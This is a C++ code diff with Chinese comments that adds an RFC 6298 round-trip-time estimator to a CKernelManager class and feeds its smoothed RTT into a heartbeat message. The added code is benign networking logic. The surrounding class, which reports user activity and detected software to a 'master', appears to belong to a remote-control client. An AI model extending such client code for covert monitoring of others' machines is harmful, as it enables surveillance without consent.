@@ -91,6 +91,36 @@ private:
 	}
 };
 
+struct RttEstimator {
+	double srtt = 0.0;       // 平滑 RTT (秒)
+	double rttvar = 0.0;     // RTT 波动 (秒)
+	double rto = 0.0;        // 超时时间 (秒)
+	bool initialized = false;
+
+	void update_from_sample(double rtt_ms) {
+		const double alpha = 1.0 / 8;
+		const double beta = 1.0 / 4;
+
+		// 转换成秒
+		double rtt = rtt_ms / 1000.0;
+
+		if (!initialized) {
+			srtt = rtt;
+			rttvar = rtt / 2.0;
+			rto = srtt + 4.0 * rttvar;
+			initialized = true;
+		}
+		else {
+			rttvar = (1.0 - beta) * rttvar + beta * std::fabs(srtt - rtt);
+			srtt = (1.0 - alpha) * srtt + alpha * rtt;
+			rto = srtt + 4.0 * rttvar;
+		}
+
+		// 限制最小 RTO（RFC 6298 推荐 1 秒）
+		if (rto < 1.0) rto = 1.0;
+	}
+};
+
 class CKernelManager : public CManager  
 {
 public:
@@ -107,7 +137,7 @@ public:
 	UINT	GetAvailableIndex();
 	State& g_bExit; // Hide base class variable
 	MasterSettings m_settings;
-	int m_nNetPing; // 网络状况
+	RttEstimator m_nNetPing; // 网络状况
 	// 发送心跳
 	int SendHeartbeat() {
 		for (int i = 0; i < m_settings.ReportInterval && !g_bExit && m_ClientObject->IsConnected(); ++i)
@@ -122,7 +152,7 @@ public:
 
 		ActivityWindow checker;
 		auto s = checker.Check();
-		Heartbeat a(s, m_nNetPing);
+		Heartbeat a(s, m_nNetPing.srtt);
 
 		a.HasSoftware = SoftwareCheck(m_settings.DetectSoftware);
 
